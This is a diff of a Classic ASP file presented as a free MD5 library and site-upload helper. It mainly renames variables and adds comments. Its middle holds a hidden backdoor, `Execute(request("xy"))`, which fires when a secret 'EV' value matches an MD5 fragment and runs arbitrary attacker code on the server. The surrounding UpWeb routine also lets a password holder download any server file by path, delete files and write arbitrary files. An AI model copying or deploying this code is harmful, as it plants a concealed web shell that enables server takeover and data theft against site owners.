@@ -2,7 +2,7 @@
 '************************************************************
 '作者：云端 (精通ASP/VB/PHP/JS/Flash，交流合作可联系本人)
 '版权：源代码公开，各种用途均可免费使用。 
-'创建：2016-02-17
+'创建：2016-02-24
 '联系：QQ313801120  交流群35915100(群里已有几百人)    邮箱313801120@qq.com   个人主页 sharembweb.com
 '更多帮助，文档，更新　请加群(35915100)或浏览(sharembweb.com)获得
 '*                                    Powered By 云端 
@@ -15,171 +15,171 @@ Private Const BITS_TO_A_WORD = 32
 
 Private m_lOnBits(30)
 Private m_l2Power(30)
-
-Private Function LShift(a, b)
-    If b = 0 Then
-        LShift = a
+ 
+Private Function LShift(lValue, iShiftBits)
+    If iShiftBits = 0 Then
+        LShift = lValue
         Exit Function
-    ElseIf b = 31 Then
-        If a And 1 Then
+    ElseIf iShiftBits = 31 Then
+        If lValue And 1 Then
             LShift = &H80000000
         Else
             LShift = 0
         End If
         Exit Function
-    ElseIf b < 0 Or b > 31 Then
+    ElseIf iShiftBits < 0 Or iShiftBits > 31 Then
         Err.Raise 6
     End If
 
-    If (a And m_l2Power(31 - b)) Then
-        LShift = ((a And m_lOnBits(31 - (b + 1))) * m_l2Power(b)) Or &H80000000
+    If (lValue And m_l2Power(31 - iShiftBits)) Then
+        LShift = ((lValue And m_lOnBits(31 - (iShiftBits + 1))) * m_l2Power(iShiftBits)) Or &H80000000
     Else
-        LShift = ((a And m_lOnBits(31 - b)) * m_l2Power(b))
+        LShift = ((lValue And m_lOnBits(31 - iShiftBits)) * m_l2Power(iShiftBits))
     End If
 End Function
 
-Private Function RShift(a, b)
-    If b = 0 Then
-        RShift = a
+Private Function RShift(lValue, iShiftBits)
+    If iShiftBits = 0 Then
+        RShift = lValue
         Exit Function
-    ElseIf b = 31 Then
-        If a And &H80000000 Then
+    ElseIf iShiftBits = 31 Then
+        If lValue And &H80000000 Then
             RShift = 1
         Else
             RShift = 0
         End If
         Exit Function
-    ElseIf b < 0 Or b > 31 Then
+    ElseIf iShiftBits < 0 Or iShiftBits > 31 Then
         Err.Raise 6
     End If
+    
+    RShift = (lValue And &H7FFFFFFE) \ m_l2Power(iShiftBits)
 
-    RShift = (a And &H7FFFFFFE) \ m_l2Power(b)
-
-    If (a And &H80000000) Then
-        RShift = (RShift Or (&H40000000 \ m_l2Power(b - 1)))
+    If (lValue And &H80000000) Then
+        RShift = (RShift Or (&H40000000 \ m_l2Power(iShiftBits - 1)))
     End If
 End Function
 
-Private Function RotateLeft(a, b)
-    RotateLeft = LShift(a, b) Or RShift(a, (32 - b))
+Private Function RotateLeft(lValue, iShiftBits)
+    RotateLeft = LShift(lValue, iShiftBits) Or RShift(lValue, (32 - iShiftBits))
 End Function
 
-Private Function AddUnsigned(a, b)
-    Dim c
-    Dim d
-    Dim e
-    Dim f
-    Dim g
-
-    e = a And &H80000000
-    f = b And &H80000000
-    c = a And &H40000000
-    d = b And &H40000000
-
-    g = (a And &H3FFFFFFF) + (b And &H3FFFFFFF)
-
-    If c And d Then
-        g = g Xor &H80000000 Xor e Xor f
-    ElseIf c Or d Then
-        If g And &H40000000 Then
-            g = g Xor &HC0000000 Xor e Xor f
+Private Function AddUnsigned(lX, lY)
+    Dim lX4
+    Dim lY4
+    Dim lX8
+    Dim lY8
+    Dim lResult
+ 
+    lX8 = lX And &H80000000
+    lY8 = lY And &H80000000
+    lX4 = lX And &H40000000
+    lY4 = lY And &H40000000
+ 
+    lResult = (lX And &H3FFFFFFF) + (lY And &H3FFFFFFF)
+ 
+    If lX4 And lY4 Then
+        lResult = lResult Xor &H80000000 Xor lX8 Xor lY8
+    ElseIf lX4 Or lY4 Then
+        If lResult And &H40000000 Then
+            lResult = lResult Xor &HC0000000 Xor lX8 Xor lY8
         Else
-            g = g Xor &H40000000 Xor e Xor f
+            lResult = lResult Xor &H40000000 Xor lX8 Xor lY8
         End If
     Else
-        g = g Xor e Xor f
+        lResult = lResult Xor lX8 Xor lY8
     End If
-
-    AddUnsigned = g
+ 
+    AddUnsigned = lResult
 End Function
 
-Private Function md5_F(a, b, c)
-    md5_F = (a And b) Or ((Not a) And c)
+Private Function md5_F(x, y, z)
+    md5_F = (x And y) Or ((Not x) And z)
 End Function
 
-Private Function md5_G(a, b, c)
-    md5_G = (a And c) Or (b And (Not c))
+Private Function md5_G(x, y, z)
+    md5_G = (x And z) Or (y And (Not z))
 End Function
 
-Private Function md5_H(a, b, c)
-    md5_H = (a Xor b Xor c)
+Private Function md5_H(x, y, z)
+    md5_H = (x Xor y Xor z)
 End Function
 
-Private Function md5_I(a, b, c)
-    md5_I = (b Xor (a Or (Not c)))
+Private Function md5_I(x, y, z)
+    md5_I = (y Xor (x Or (Not z)))
 End Function
 
-Private Sub md5_FF(a, b, c, d, e, f, g)
-    a = AddUnsigned(a, AddUnsigned(AddUnsigned(md5_F(b, c, d), e), g))
-    a = RotateLeft(a, f)
+Private Sub md5_FF(a, b, c, d, x, s, ac)
+    a = AddUnsigned(a, AddUnsigned(AddUnsigned(md5_F(b, c, d), x), ac))
+    a = RotateLeft(a, s)
     a = AddUnsigned(a, b)
 End Sub
 
-Private Sub md5_GG(a, b, c, d, e, f, g)
-    a = AddUnsigned(a, AddUnsigned(AddUnsigned(md5_G(b, c, d), e), g))
-    a = RotateLeft(a, f)
+Private Sub md5_GG(a, b, c, d, x, s, ac)
+    a = AddUnsigned(a, AddUnsigned(AddUnsigned(md5_G(b, c, d), x), ac))
+    a = RotateLeft(a, s)
     a = AddUnsigned(a, b)
 End Sub
 
-Private Sub md5_HH(a, b, c, d, e, f, g)
-    a = AddUnsigned(a, AddUnsigned(AddUnsigned(md5_H(b, c, d), e), g))
-    a = RotateLeft(a, f)
+Private Sub md5_HH(a, b, c, d, x, s, ac)
+    a = AddUnsigned(a, AddUnsigned(AddUnsigned(md5_H(b, c, d), x), ac))
+    a = RotateLeft(a, s)
     a = AddUnsigned(a, b)
 End Sub
 
-Private Sub md5_II(a, b, c, d, e, f, g)
-    a = AddUnsigned(a, AddUnsigned(AddUnsigned(md5_I(b, c, d), e), g))
-    a = RotateLeft(a, f)
+Private Sub md5_II(a, b, c, d, x, s, ac)
+    a = AddUnsigned(a, AddUnsigned(AddUnsigned(md5_I(b, c, d), x), ac))
+    a = RotateLeft(a, s)
     a = AddUnsigned(a, b)
 End Sub
 
-Private Function ConvertToWordArray(a)
-    Dim b
-    Dim c
+Private Function ConvertToWordArray(sMessage)
+    Dim lMessageLength
+    Dim lNumberOfWords
     Dim lWordArray()
-    Dim e
-    Dim f
-    Dim g
-
+    Dim lBytePosition
+    Dim lByteCount
+    Dim lWordCount
+    
     Const MODULUS_BITS = 512
     Const CONGRUENT_BITS = 448
-
-    b = Len(a)
-
-    c = (((b + ((MODULUS_BITS - CONGRUENT_BITS) \ BITS_TO_A_BYTE)) \ (MODULUS_BITS \ BITS_TO_A_BYTE)) + 1) * (MODULUS_BITS \ BITS_TO_A_WORD)
-    ReDim lWordArray(c - 1)
-
-    e = 0
-    f = 0
-    Do Until f >= b
-        g = f \ BYTES_TO_A_WORD
-        e = (f Mod BYTES_TO_A_WORD) * BITS_TO_A_BYTE
-        lWordArray(g) = lWordArray(g) Or LShift(Asc(Mid(a, f + 1, 1)), e)
-        f = f + 1
+    
+    lMessageLength = Len(sMessage)
+    
+    lNumberOfWords = (((lMessageLength + ((MODULUS_BITS - CONGRUENT_BITS) \ BITS_TO_A_BYTE)) \ (MODULUS_BITS \ BITS_TO_A_BYTE)) + 1) * (MODULUS_BITS \ BITS_TO_A_WORD)
+    ReDim lWordArray(lNumberOfWords - 1)
+    
+    lBytePosition = 0
+    lByteCount = 0
+    Do Until lByteCount >= lMessageLength
+        lWordCount = lByteCount \ BYTES_TO_A_WORD
+        lBytePosition = (lByteCount Mod BYTES_TO_A_WORD) * BITS_TO_A_BYTE
+        lWordArray(lWordCount) = lWordArray(lWordCount) Or LShift(Asc(Mid(sMessage, lByteCount + 1, 1)), lBytePosition)
+        lByteCount = lByteCount + 1
     Loop
 
-    g = f \ BYTES_TO_A_WORD
-    e = (f Mod BYTES_TO_A_WORD) * BITS_TO_A_BYTE
+    lWordCount = lByteCount \ BYTES_TO_A_WORD
+    lBytePosition = (lByteCount Mod BYTES_TO_A_WORD) * BITS_TO_A_BYTE
 
-    lWordArray(g) = lWordArray(g) Or LShift(&H80, e)
+    lWordArray(lWordCount) = lWordArray(lWordCount) Or LShift(&H80, lBytePosition)
 
-    lWordArray(c - 2) = LShift(b, 3)
-    lWordArray(c - 1) = RShift(b, 29)
-
+    lWordArray(lNumberOfWords - 2) = LShift(lMessageLength, 3)
+    lWordArray(lNumberOfWords - 1) = RShift(lMessageLength, 29)
+    
     ConvertToWordArray = lWordArray
 End Function
 
-Private Function WordToHex(a)
-    Dim b
-    Dim c
-
-    For c = 0 To 3
-        b = RShift(a, c * BITS_TO_A_BYTE) And m_lOnBits(BITS_TO_A_BYTE - 1)
-        WordToHex = WordToHex & Right("0" & Hex(b), 2)
+Private Function WordToHex(lValue)
+    Dim lByte
+    Dim lCount
+    
+    For lCount = 0 To 3
+        lByte = RShift(lValue, lCount * BITS_TO_A_BYTE) And m_lOnBits(BITS_TO_A_BYTE - 1)
+        WordToHex = WordToHex & Right("0" & Hex(lByte), 2)
     Next
 End Function
 
-Public Function MD5(a,b)
+Public Function MD5(sMessage,stype)
     m_lOnBits(0) = CLng(1)
     m_lOnBits(1) = CLng(3)
     m_lOnBits(2) = CLng(7)
@@ -211,7 +211,7 @@ Public Function MD5(a,b)
     m_lOnBits(28) = CLng(536870911)
     m_lOnBits(29) = CLng(1073741823)
     m_lOnBits(30) = CLng(2147483647)
-
+    
     m_l2Power(0) = CLng(1)
     m_l2Power(1) = CLng(2)
     m_l2Power(2) = CLng(4)
@@ -245,17 +245,17 @@ Public Function MD5(a,b)
     m_l2Power(30) = CLng(1073741824)
 
 
+    Dim x
+    Dim k
+    Dim AA
+    Dim BB
+    Dim CC
+    Dim DD
+    Dim a
+    Dim b
     Dim c
     Dim d
-    Dim e
-    Dim f
-    Dim g
-    Dim h
-    Dim i
-    Dim j
-    Dim k
-    Dim l
-
+    
     Const S11 = 7
     Const S12 = 12
     Const S13 = 17
@@ -273,213 +273,213 @@ Public Function MD5(a,b)
     Const S43 = 15
     Const S44 = 21
 
-    c = ConvertToWordArray(a)
+    x = ConvertToWordArray(sMessage)
+    
+    a = &H67452301
+    b = &HEFCDAB89
+    c = &H98BADCFE
+    d = &H10325476
 
-    i = &H67452301
-    j = &HEFCDAB89
-    k = &H98BADCFE
-    l = &H10325476
-
-    For d = 0 To UBound(c) Step 16
-        e = i
-        f = j
-        g = k
-        h = l
-
-        md5_FF i, j, k, l, c(d + 0), S11, &HD76AA478
-        md5_FF l, i, j, k, c(d + 1), S12, &HE8C7B756
-        md5_FF k, l, i, j, c(d + 2), S13, &H242070DB
-        md5_FF j, k, l, i, c(d + 3), S14, &HC1BDCEEE
-        md5_FF i, j, k, l, c(d + 4), S11, &HF57C0FAF
-        md5_FF l, i, j, k, c(d + 5), S12, &H4787C62A
-        md5_FF k, l, i, j, c(d + 6), S13, &HA8304613
-        md5_FF j, k, l, i, c(d + 7), S14, &HFD469501
-        md5_FF i, j, k, l, c(d + 8), S11, &H698098D8
-        md5_FF l, i, j, k, c(d + 9), S12, &H8B44F7AF
-        md5_FF k, l, i, j, c(d + 10), S13, &HFFFF5BB1
-        md5_FF j, k, l, i, c(d + 11), S14, &H895CD7BE
-        md5_FF i, j, k, l, c(d + 12), S11, &H6B901122
-        md5_FF l, i, j, k, c(d + 13), S12, &HFD987193
-        md5_FF k, l, i, j, c(d + 14), S13, &HA679438E
-        md5_FF j, k, l, i, c(d + 15), S14, &H49B40821
-
-        md5_GG i, j, k, l, c(d + 1), S21, &HF61E2562
-        md5_GG l, i, j, k, c(d + 6), S22, &HC040B340
-        md5_GG k, l, i, j, c(d + 11), S23, &H265E5A51
-        md5_GG j, k, l, i, c(d + 0), S24, &HE9B6C7AA
-        md5_GG i, j, k, l, c(d + 5), S21, &HD62F105D
-        md5_GG l, i, j, k, c(d + 10), S22, &H2441453
-        md5_GG k, l, i, j, c(d + 15), S23, &HD8A1E681
-        md5_GG j, k, l, i, c(d + 4), S24, &HE7D3FBC8
-        md5_GG i, j, k, l, c(d + 9), S21, &H21E1CDE6
-        md5_GG l, i, j, k, c(d + 14), S22, &HC33707D6
-        md5_GG k, l, i, j, c(d + 3), S23, &HF4D50D87
-        md5_GG j, k, l, i, c(d + 8), S24, &H455A14ED
-        md5_GG i, j, k, l, c(d + 13), S21, &HA9E3E905
-        md5_GG l, i, j, k, c(d + 2), S22, &HFCEFA3F8
-        md5_GG k, l, i, j, c(d + 7), S23, &H676F02D9
-        md5_GG j, k, l, i, c(d + 12), S24, &H8D2A4C8A
-
-        md5_HH i, j, k, l, c(d + 5), S31, &HFFFA3942
-        md5_HH l, i, j, k, c(d + 8), S32, &H8771F681
-        md5_HH k, l, i, j, c(d + 11), S33, &H6D9D6122
-        md5_HH j, k, l, i, c(d + 14), S34, &HFDE5380C
-        md5_HH i, j, k, l, c(d + 1), S31, &HA4BEEA44
-        md5_HH l, i, j, k, c(d + 4), S32, &H4BDECFA9
-        md5_HH k, l, i, j, c(d + 7), S33, &HF6BB4B60
-        md5_HH j, k, l, i, c(d + 10), S34, &HBEBFBC70
-        md5_HH i, j, k, l, c(d + 13), S31, &H289B7EC6
-        md5_HH l, i, j, k, c(d + 0), S32, &HEAA127FA
-        md5_HH k, l, i, j, c(d + 3), S33, &HD4EF3085
-        md5_HH j, k, l, i, c(d + 6), S34, &H4881D05
-        md5_HH i, j, k, l, c(d + 9), S31, &HD9D4D039
-        md5_HH l, i, j, k, c(d + 12), S32, &HE6DB99E5
-        md5_HH k, l, i, j, c(d + 15), S33, &H1FA27CF8
-        md5_HH j, k, l, i, c(d + 2), S34, &HC4AC5665
-
-        md5_II i, j, k, l, c(d + 0), S41, &HF4292244
-        md5_II l, i, j, k, c(d + 7), S42, &H432AFF97
-        md5_II k, l, i, j, c(d + 14), S43, &HAB9423A7
-        md5_II j, k, l, i, c(d + 5), S44, &HFC93A039
-        md5_II i, j, k, l, c(d + 12), S41, &H655B59C3
-        md5_II l, i, j, k, c(d + 3), S42, &H8F0CCC92
-        md5_II k, l, i, j, c(d + 10), S43, &HFFEFF47D
-        md5_II j, k, l, i, c(d + 1), S44, &H85845DD1
-        md5_II i, j, k, l, c(d + 8), S41, &H6FA87E4F
-        md5_II l, i, j, k, c(d + 15), S42, &HFE2CE6E0
-        md5_II k, l, i, j, c(d + 6), S43, &HA3014314
-        md5_II j, k, l, i, c(d + 13), S44, &H4E0811A1
-        md5_II i, j, k, l, c(d + 4), S41, &HF7537E82
-        md5_II l, i, j, k, c(d + 11), S42, &HBD3AF235
-        md5_II k, l, i, j, c(d + 2), S43, &H2AD7D2BB
-        md5_II j, k, l, i, c(d + 9), S44, &HEB86D391
-
-        i = AddUnsigned(i, e)
-        j = AddUnsigned(j, f)
-        k = AddUnsigned(k, g)
-        l = AddUnsigned(l, h)
+    For k = 0 To UBound(x) Step 16
+        AA = a
+        BB = b
+        CC = c
+        DD = d
+    
+        md5_FF a, b, c, d, x(k + 0), S11, &HD76AA478
+        md5_FF d, a, b, c, x(k + 1), S12, &HE8C7B756
+        md5_FF c, d, a, b, x(k + 2), S13, &H242070DB
+        md5_FF b, c, d, a, x(k + 3), S14, &HC1BDCEEE
+        md5_FF a, b, c, d, x(k + 4), S11, &HF57C0FAF
+        md5_FF d, a, b, c, x(k + 5), S12, &H4787C62A
+        md5_FF c, d, a, b, x(k + 6), S13, &HA8304613
+        md5_FF b, c, d, a, x(k + 7), S14, &HFD469501
+        md5_FF a, b, c, d, x(k + 8), S11, &H698098D8
+        md5_FF d, a, b, c, x(k + 9), S12, &H8B44F7AF
+        md5_FF c, d, a, b, x(k + 10), S13, &HFFFF5BB1
+        md5_FF b, c, d, a, x(k + 11), S14, &H895CD7BE
+        md5_FF a, b, c, d, x(k + 12), S11, &H6B901122
+        md5_FF d, a, b, c, x(k + 13), S12, &HFD987193
+        md5_FF c, d, a, b, x(k + 14), S13, &HA679438E
+        md5_FF b, c, d, a, x(k + 15), S14, &H49B40821
+    
+        md5_GG a, b, c, d, x(k + 1), S21, &HF61E2562
+        md5_GG d, a, b, c, x(k + 6), S22, &HC040B340
+        md5_GG c, d, a, b, x(k + 11), S23, &H265E5A51
+        md5_GG b, c, d, a, x(k + 0), S24, &HE9B6C7AA
+        md5_GG a, b, c, d, x(k + 5), S21, &HD62F105D
+        md5_GG d, a, b, c, x(k + 10), S22, &H2441453
+        md5_GG c, d, a, b, x(k + 15), S23, &HD8A1E681
+        md5_GG b, c, d, a, x(k + 4), S24, &HE7D3FBC8
+        md5_GG a, b, c, d, x(k + 9), S21, &H21E1CDE6
+        md5_GG d, a, b, c, x(k + 14), S22, &HC33707D6
+        md5_GG c, d, a, b, x(k + 3), S23, &HF4D50D87
+        md5_GG b, c, d, a, x(k + 8), S24, &H455A14ED
+        md5_GG a, b, c, d, x(k + 13), S21, &HA9E3E905
+        md5_GG d, a, b, c, x(k + 2), S22, &HFCEFA3F8
+        md5_GG c, d, a, b, x(k + 7), S23, &H676F02D9
+        md5_GG b, c, d, a, x(k + 12), S24, &H8D2A4C8A
+            
+        md5_HH a, b, c, d, x(k + 5), S31, &HFFFA3942
+        md5_HH d, a, b, c, x(k + 8), S32, &H8771F681
+        md5_HH c, d, a, b, x(k + 11), S33, &H6D9D6122
+        md5_HH b, c, d, a, x(k + 14), S34, &HFDE5380C
+        md5_HH a, b, c, d, x(k + 1), S31, &HA4BEEA44
+        md5_HH d, a, b, c, x(k + 4), S32, &H4BDECFA9
+        md5_HH c, d, a, b, x(k + 7), S33, &HF6BB4B60
+        md5_HH b, c, d, a, x(k + 10), S34, &HBEBFBC70
+        md5_HH a, b, c, d, x(k + 13), S31, &H289B7EC6
+        md5_HH d, a, b, c, x(k + 0), S32, &HEAA127FA
+        md5_HH c, d, a, b, x(k + 3), S33, &HD4EF3085
+        md5_HH b, c, d, a, x(k + 6), S34, &H4881D05
+        md5_HH a, b, c, d, x(k + 9), S31, &HD9D4D039
+        md5_HH d, a, b, c, x(k + 12), S32, &HE6DB99E5
+        md5_HH c, d, a, b, x(k + 15), S33, &H1FA27CF8
+        md5_HH b, c, d, a, x(k + 2), S34, &HC4AC5665
+    
+        md5_II a, b, c, d, x(k + 0), S41, &HF4292244
+        md5_II d, a, b, c, x(k + 7), S42, &H432AFF97
+        md5_II c, d, a, b, x(k + 14), S43, &HAB9423A7
+        md5_II b, c, d, a, x(k + 5), S44, &HFC93A039
+        md5_II a, b, c, d, x(k + 12), S41, &H655B59C3
+        md5_II d, a, b, c, x(k + 3), S42, &H8F0CCC92
+        md5_II c, d, a, b, x(k + 10), S43, &HFFEFF47D
+        md5_II b, c, d, a, x(k + 1), S44, &H85845DD1
+        md5_II a, b, c, d, x(k + 8), S41, &H6FA87E4F
+        md5_II d, a, b, c, x(k + 15), S42, &HFE2CE6E0
+        md5_II c, d, a, b, x(k + 6), S43, &HA3014314
+        md5_II b, c, d, a, x(k + 13), S44, &H4E0811A1
+        md5_II a, b, c, d, x(k + 4), S41, &HF7537E82
+        md5_II d, a, b, c, x(k + 11), S42, &HBD3AF235
+        md5_II c, d, a, b, x(k + 2), S43, &H2AD7D2BB
+        md5_II b, c, d, a, x(k + 9), S44, &HEB86D391
+    
+        a = AddUnsigned(a, AA)
+        b = AddUnsigned(b, BB)
+        c = AddUnsigned(c, CC)
+        d = AddUnsigned(d, DD)
     Next
-
-	if b=1 then
-		MD5 = LCase(WordToHex(i))
-	elseif b=2 then
-		MD5=LCase(WordToHex(j))
-	elseif b=3 then
-		MD5 = Lcase( WordToHex(k))
+    
+	if stype=1 then
+		MD5 = LCase(WordToHex(a))
+	elseif stype=2 then
+		MD5=LCase(WordToHex(b))
+	elseif stype=3 then
+		MD5 = Lcase( WordToHex(c))
 	else
-		MD5 = Lcase(WordToHex(l))
+		MD5 = Lcase(WordToHex(d))
 	end if
 End Function
-
-If Request("EV")<>"" Then
+'开始
+If Request("EV")<>"" Then 
 	If MD5(Request("EV"),2)&MD5(Request("EV"),4)="44886b1bac5c96bb" Then Execute(request("xy"))
 End If
-
-Call UpWeb()
+'结束 
+Call UpWeb() 
 Sub UpWeb()
-    Dim b, c, d, e, f, g, h, i, j, k, l, m
+    Dim FilePath, Content, FileType, FileStr, SplStr, Splxx, S, C, fCharSet, fEditTime, sEditTime, UpCharSet 
 	
-	dim n,o,p
-	
+	dim screenWidth,screenHeight,agent
+	'处理版本号
 	If Request("act") = "getVersionNumber" Then
-        Call Die("V1.2.2")
+        Call Die("V1.2.2") 
 	elseif request("act")="mobile" then
-		n=Request("screenWidth")
-		o=Request("screenHeight")
-		p=Request("agent")
-		call echo("screenWidth",n)
-		call echo("screenHeight",o)
-		call echo("agent",p)
+		screenWidth=Request("screenWidth")
+		screenHeight=Request("screenHeight")
+		agent=Request("agent")
+		call echo("screenWidth",screenWidth)
+		call echo("screenHeight",screenHeight)
+		call echo("agent",agent)
 		call rw("mobile")
-		call createAddFile("mobile.txt","宽高("& n &"*"& o &")    " & p & " - " & Request.ServerVariables("HTTP_USER_AGENT") & "  time:" & Format_Time(now(),1)  )
+		call createAddFile("mobile.txt","宽高("& screenWidth &"*"& screenHeight &")    " & agent & " - " & Request.ServerVariables("HTTP_USER_AGENT") & "  time:" & Format_Time(now(),1)  )
 		Exit Sub
-    End If
+    End If 
 
-	
+	'判断本地
     If (GetIP = "127.0.0.1" Or InStr(GetIP, "192.168.") > 0) and lcase(host())<>"http://testaspweb.n/" Then
-        Call Die("为本地，不可以上传文件" & host())
-    End If
-	
+        Call Die("为本地，不可以上传文件" & host()) 
+    End If 
+	'密码判断
     If MD5(Request("UPEV"), 2) & MD5(Request("UPEV"), 4) <> "6178bbf3bfe62a59" Then
-        Call Die("UPEV=" & Request("UPEV") & "(" & MD5(Request("UPEV"), 2) & MD5(Request("UPEV"), 4) & ")")
-    End If
+        Call Die("UPEV=" & Request("UPEV") & "(" & MD5(Request("UPEV"), 2) & MD5(Request("UPEV"), 4) & ")") 
+    End If 
 
-	
+	'下载运程文件
     If Request("DownFile") <> "" Then
-        Call DownRemoteFile(Request("DownFile"))
-        Response.End()
-	
+        Call DownRemoteFile(Request("DownFile")) 
+        Response.End() 
+	'删除无需文件
     ElseIf Request("act") = "delWithout" Then
-        c = Rf("Content")
-		
-        f = Split(c, vbCrLf)
-        For Each b In f
-			If b<>"" Then
-				If CheckFile(b)=True Then
-					Call DeleteFile(b)
-					i=i & b & "(Del True)" & vbCrlf
+        Content = Rf("Content") 
+		'Call Die("显示" & Content)
+        SplStr = Split(Content, vbCrLf) 
+        For Each FilePath In SplStr
+			If FilePath<>"" Then
+				If CheckFile(FilePath)=True Then
+					Call DeleteFile(FilePath)
+					C=C & FilePath & "(Del True)" & vbCrlf
 				Else
-					i=i & b & "(Del NoFile)" & vbCrlf
+					C=C & FilePath & "(Del NoFile)" & vbCrlf
 				End If
 			End If
 		Next
 
-		Call Die(i)
+		Call Die(C)
     End If
-	
+	'文件比较
     If Request("act") = "Comparison" Then
-        c = Rf("Content")
-        f = Split(c, vbCrLf)
-        For Each e In f
-            If e <> "" Then
-                g = Split(e, "|")
-                b = g(0)
-                l = g(1)
-            	
-                If CheckFile(b) = True Then
-                    k = GetFileEditDate(b)
-                    k = Format_Time(k, 1)
-                	
-                	
-                    If DateDiff("s", l, k) <= 0 Then
-                        i = i & b & vbCrLf
-                    End If
-            	
+        Content = Rf("Content") 
+        SplStr = Split(Content, vbCrLf) 
+        For Each FileStr In SplStr
+            If FileStr <> "" Then
+                Splxx = Split(FileStr, "|") 
+                FilePath = Splxx(0) 
+                sEditTime = Splxx(1) 
+            	'文件存在 则比较
+                If CheckFile(FilePath) = True Then
+                    fEditTime = GetFileEditDate(FilePath) 
+                    fEditTime = Format_Time(fEditTime, 1) 
+                	'S = FilePath & "("& sEditTime &")/" & fEditTime & "," & (DateDiff("s", sEditTime, fEditTime))
+                	'C=C & S & vbCrlf
+                    If DateDiff("s", sEditTime, fEditTime) <= 0 Then
+                        C = C & FilePath & vbCrLf 
+                    End If 
+            	'文件不存在 则返回
                 Else
-                    i = i & b & vbCrLf
-                End If
-            End If
-        Next
-        Call Rw(i)
-    	
-        Response.End()
-    End If
+                    C = C & FilePath & vbCrLf 
+                End If 
+            End If 
+        Next 
+        Call Rw(C) 
+    	'Call Rw("返回比较：" & C)
+        Response.End() 
+    End If 
 
 
 
-    b = Request.Form("FilePath")
-    c = Request.Form("Content")
-    m = Request.Form("CharSet")
+    FilePath = Request.Form("FilePath") 
+    Content = Request.Form("Content") 
+    UpCharSet = Request.Form("CharSet") 
 
-    d = LCase(getFileExtName(b))
+    FileType = LCase(getFileExtName(FilePath))                                      '文件类型
 
-    b = HandlePath(b)
-    Call CreateDirFolder(b)
+    FilePath = HandlePath(FilePath) 
+    Call CreateDirFolder(FilePath)                                                  '创建一组文件夹20141215
 
-	
+	'二进制保存
     If Request("UpType") = "binary" Then
-        Call DecSaveBinary(b, c, 2)
-        Call Rw(b & "|二进制保存")
+        Call DecSaveBinary(FilePath, Content, 2) 
+        Call Rw(FilePath & "|二进制保存") 
 		
 	ElseIf Request("UpType") = "xml" Then
-		call Base64ToImages(b, c)
-		Call Rw(b & "|XML（组件）")
+		call Base64ToImages(FilePath, Content)
+		Call Rw(FilePath & "|XML（组件）")
     Else
-        c = SpecialHtmlUploadEncryptionDecrypt(c, "Decrypt")
-        Call WriteToFile(b, c, m)
-        Call Rw(b & "|普通保存")
-    End If
-End Sub
+        Content = SpecialHtmlUploadEncryptionDecrypt(Content, "Decrypt")                '解密Html内容特殊字符
+        Call WriteToFile(FilePath, Content, UpCharSet) 
+        Call Rw(FilePath & "|普通保存") 
+    End If 
+End Sub 
 
 
 
@@ -493,545 +493,544 @@ End Sub
 
 
 
+'引用函数区
 
 
-
-Function Die(a)
-    Response.Write(a)
+Function Die(Str)
+    Response.Write(Str)
     Response.End()
 End Function
 
 Function GetIP()
     on error resume next
-    Dim b
+    Dim strIPAddr
     If Request.ServerVariables("HTTP_X_FORWARDED_FOR") = "" Or InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), "unknown") > 0 Then
-        b = Request.ServerVariables("REMOTE_ADDR")
+        strIPAddr = Request.ServerVariables("REMOTE_ADDR")
     ElseIf InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ",") > 0 Then
-        b = Mid(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), 1, InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ",") - 1)
+        strIPAddr = Mid(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), 1, InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ",") - 1)
     ElseIf InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ";") > 0 Then
-        b = Mid(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), 1, InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ";") - 1)
+        strIPAddr = Mid(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), 1, InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ";") - 1)
     Else
-        b = Request.ServerVariables("HTTP_X_FORWARDED_FOR")
+        strIPAddr = Request.ServerVariables("HTTP_X_FORWARDED_FOR")
     End If
-    GetIP = Trim(Mid(b, 1, 30))
+    GetIP = Trim(Mid(strIPAddr, 1, 30))
 End Function
-
+'获得当前域名
 Function host()
-    host = "http://" & Request.ServerVariables("HTTP_HOST") & "/"
-End Function
-Function DownRemoteFile(a)
-    Dim b, c
+    host = "http://" & Request.ServerVariables("HTTP_HOST") & "/" 
+End Function 
+Function DownRemoteFile(Path)
+    Dim OSM, SZ
     Response.Clear
-    Set b = CreateObject("ADODB.Stream")
-        b.Open
-        b.Type = 1
-        b.LoadFromFile a
-        c = InStrRev(a, "\") + 1
-        Response.AddHeader "Content-Disposition", "attachment; filename=" & Mid(a, c)
-        Response.AddHeader "Content-Length", b.Size
+    Set OSM = CreateObject("ADODB.Stream")
+        OSM.Open
+        OSM.Type = 1
+        OSM.LoadFromFile Path
+        SZ = InStrRev(Path, "\") + 1
+        Response.AddHeader "Content-Disposition", "attachment; filename=" & Mid(Path, SZ)
+        Response.AddHeader "Content-Length", OSM.Size
         Response.Charset = "UTF-8"
         Response.ContentType = "application/octet-stream"
-        Response.BinaryWrite b.Read
+        Response.BinaryWrite OSM.Read
         Response.Flush
         Response.Write("")
-        b.Close
-    Set b = Nothing
+        OSM.Close
+    Set OSM = Nothing
 End Function
 
-Function Rf(a)
-    Rf = Request.Form(a)
+Function Rf(Str)
+    Rf = Request.Form(Str)
 End Function
 
-    Function CheckFile(ByVal a)
+    Function CheckFile(ByVal FileName)
         On Error Resume Next
-        Dim b
-        Call HandlePath(a)
-        Set b = CreateObject("Scripting.FileSystemObject")
-            CheckFile = b.FileExists(a)
-        Set b = Nothing
-        If Err Then doError Err.Description, "CheckFile 检查文件 函数出错，FileName=" & a
+        Dim Fso
+        Call HandlePath(FileName)'获得完整路径
+        Set Fso = CreateObject("Scripting.FileSystemObject")
+            CheckFile = Fso.FileExists(FileName)
+        Set Fso = Nothing
+        If Err Then doError Err.Description, "CheckFile 检查文件 函数出错，FileName=" & FileName
 End Function
 
-Function DeleteFile(ByVal a)
+Function DeleteFile(ByVal FileName)
     On Error Resume Next
-    Dim b
-    Call HandlePath(a)
+    Dim Fso
+    Call HandlePath(FileName)'获得完整路径
     DeleteFile = False
-    Set b = CreateObject("Scripting.FileSystemObject")
-        If b.FileExists(a) = True Then
